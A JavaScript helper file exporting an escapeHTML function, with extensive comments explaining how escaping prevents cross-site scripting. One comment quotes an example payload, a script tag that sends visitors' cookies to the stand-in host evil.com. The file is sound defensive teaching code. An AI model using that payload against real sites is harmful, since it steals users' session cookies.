// ==============================================
// UTILITY / HELPER FUNCTIONS
// ==============================================
// This file contains small, reusable functions
// that are used across multiple parts of the app.
// Keeping them in one place avoids code duplication
// and makes them easy to find and maintain.
// ==============================================

// ------------------------------------------
// escapeHTML - Prevent XSS Attacks
// ------------------------------------------
// XSS (Cross-Site Scripting) is a security attack
// where a malicious user injects JavaScript code
// into your website through user input fields.
//
// EXAMPLE OF AN XSS ATTACK:
// Imagine a user submits a review with this content:
// <script>document.location='http://evil.com?cookie='+document.cookie</script>
//
// If we display this review without escaping it,
// the browser will EXECUTE that script, potentially
// stealing cookies, session tokens, or other data
// from anyone who views the page.
//
// HOW escapeHTML PREVENTS THIS:
// It converts dangerous HTML characters into their
// "entity" equivalents that browsers display as text
// instead of interpreting as code:
// < becomes &lt; (prevents opening HTML tags)
// > becomes &gt; (prevents closing HTML tags)
// & becomes &amp; (prevents entity injection)
// " becomes &quot; (prevents attribute breakout)
// ' becomes &#039; (prevents attribute breakout)
//
// So <script>alert('xss')</script> becomes:
// &lt;script&gt;alert(&#039;xss&#039;)&lt;/script&gt;
// which is displayed as harmless text, not executed.
//
// USAGE:
// const safe = escapeHTML(userInput);

function escapeHTML(str) {
 // If the input is empty or undefined, return an empty string.
 // This prevents errors when trying to call .replace() on null/undefined.
 if (!str) return '';

 return str
 .replace(/&/g, '&amp;') // Must be first! (otherwise it double-escapes)
 .replace(/</g, '&lt;') // Prevents <script> tags
 .replace(/>/g, '&gt;') // Prevents closing tags
 .replace(/"/g, '&quot;') // Prevents breaking out of attributes
 .replace(/'/g, '&#039;'); // Prevents breaking out of single-quoted attributes
}

// ------------------------------------------
// Export Helper Functions
// ------------------------------------------
// We use an object so we can easily add more
// helper functions in the future:
// const { escapeHTML, anotherHelper } = require('../utils/helpers');

module.exports = { escapeHTML };
